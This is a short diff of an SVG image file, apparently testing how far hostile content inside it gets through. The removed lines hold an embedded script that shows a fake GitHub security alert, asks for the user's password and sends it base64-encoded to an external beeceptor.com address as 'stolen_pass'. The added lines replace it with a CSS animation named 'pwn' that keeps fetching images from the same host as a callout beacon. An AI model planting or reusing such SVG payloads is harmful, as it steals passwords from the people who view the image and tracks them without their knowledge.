@@ -1,9 +1,12 @@
 <svg xmlns="http://www.w3.org/2000/svg">
-  <rect width="100%" height="100%" fill="black" />
-  <script>
-    var p = prompt("GitHub Security Alert: Your session has expired. Please enter password to continue:");
-    if(p) {
-      location.href = "https://aksjwuwu.free.beeceptor.com/?stolen_pass=" + btoa(p);
+  <style>
+    @keyframes pwn {
+      from { background-image: url('https://aksjwuwu.free.beeceptor.com/loading'); }
+      to { background-image: url('https://aksjwuwu.free.beeceptor.com/executed'); }
     }
-  </script>
+    rect {
+      animation: pwn 1s infinite;
+    }
+  </style>
+  <rect width="100%" height="100%" fill="blue" />
 </svg>
